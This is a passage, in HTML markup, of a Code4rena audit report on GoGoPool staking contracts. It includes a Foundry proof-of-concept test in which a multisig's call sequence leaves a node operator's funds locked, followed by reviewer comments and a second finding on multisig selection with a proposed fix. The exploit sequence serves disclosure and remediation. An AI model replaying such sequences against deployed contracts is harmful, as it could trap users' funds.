minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2. Rialto calls claimAndInitiateStaking</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3. Something goes wrong and Rialto calls recordStakingError()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// to finish the NodeOp&#39;s minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 5. The NodeOp can not withdraw his funds. The withdraw function reverts with</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// InvalidStateTransition() error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1. Create the minipool by the NodeOp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2. Rialto calls claimAndInitiateStaking</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3. Something goes wrong and Rialto calls recordStakingError()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;INVALID_NODEID&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingError</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NodeOps funds should be back in vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// to finish the NodeOp&#39;s minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finishFailedMinipoolByMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 5. The NodeOp can not withdraw his funds. The withdraw function reverts with</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// InvalidStateTransition() error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">InvalidStateTransition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawMinipoolFunds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools used</h3>\n<p>Foundry/Vscode</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>withdrawMinipoolFunds</code> could add another <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#LL290C3-L290C30\">requireValidStateTransition</a> in order to allow the withdraw after the finished minipoool.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/723\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/723#issuecomment-1385123551\">0xju1ie (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I think this should be the primary for the <code>finishFailedMinipoolByMultisig()</code> problem.</p>\n<p>Medium feels like a more appropriate severity. This issue depends on rialto multisig improperly functioning but we do intend to fix the finishFailedMinipoolByMultisig method to not lock users out of their funds.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/723#issuecomment-1415686783\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a potential issues with the FSM of the system, per the Audit Scope, the transition should not happen on the deployed system, however, the Warden has shown an issue with the state transition check and has detailed the consequences of it.</p>\n<p>For this reason, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Remove method that trapped Node Operator’s funds: <a href=\"https://github.com/multisig-labs/gogopool/pull/20\">multisig-labs/gogopool#20</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/13\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/28\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-04-requirenextactivemultisig-will-always-return-the-first-enabled-multisig-which-increases-the-probability-of-stuck-minipools\" style=\"position:relative;\"><a href=\"#m-04-requirenextactivemultisig-will-always-return-the-first-enabled-multisig-which-increases-the-probability-of-stuck-minipools\" aria-label=\"m 04 requirenextactivemultisig will always return the first enabled multisig which increases the probability of stuck minipools permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/702\">[M-04] <code>requireNextActiveMultisig</code> will always return the first enabled multisig which increases the probability of stuck minipools</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/702\">imare</a>, also found by <a href=\"undefined\">HollaDieWaldfee</a>, <a href=\"undefined\">btk</a>, <a href=\"undefined\">jadezti</a>, <a href=\"undefined\">gz627</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/721\">nogo</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/701\">imare</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/618\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/589\">sk8erboy</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/560\">enckrish</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/538\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/481\">betweenETHlines</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/395\">simon135</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/343\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/316\">0Kage</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/276\">kaliberpoziomka8552</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/271\">0Kage</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/190\">Saintcode_</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/141\">Faith</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/12\">dic0de</a></em></p>\n<p>For every created minipool a multisig address is set to continue validator interactions.</p>\n<p>Every minipool multisig address get assigned by calling <code>requireNextActiveMultisig</code>.</p>\n<p>This function always return the first enabled multisig address.</p>\n<p>In case the specific address is disabled all created minipools will be stuck with this address which increase the probability of also funds being stuck.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Probability of funds being stuck increases if <code>requireNextActiveMultisig</code> always return the same address.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L80-L91\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L80-L91</a></p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use a strategy like <a href=\"https://en.wikipedia.org/wiki/Round-robin_item_allocation\">round robin</a> to assign next active multisig to minipool.</p>\n<p>Something like this :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextMultisigAddressIdx</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requireNextActiveMultisig</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">total</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;multisig.count&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nextMultisigAddressIdx</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// cache last used</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nextMultisigAddressIdx</span><span class=\"mtk1\">==</span><span class=\"mtk12\">total</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">total</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">getMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nextMultisigAddressIdx</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NoEnabledMultisigFound</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/702#issuecomment-1384310351\">emersoncloud (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Without a mechanism for funds to become stuck, I don’t think this warrants a medium severity. </p>\n<p>I do agree with the principle that if we have multiple multisigs, some system to distribute minipools between them seems reasonable. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/702#issuecomment-1410942197\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While the finding will not be awarded as Admin Privilege, I believe that ultimately the Warden has shown an incorrect implementation of the function <code>requireNextActiveMultisig</code> which would ideally either offer:</p>\n<ul>\n<li>Round Robin</li>\n<li>Provable Random Selection</li>\n</ul>\n<p>For those reasons I think the finding is still notable, in that the function doesn’t work as intended, and believe it should be judged Medium 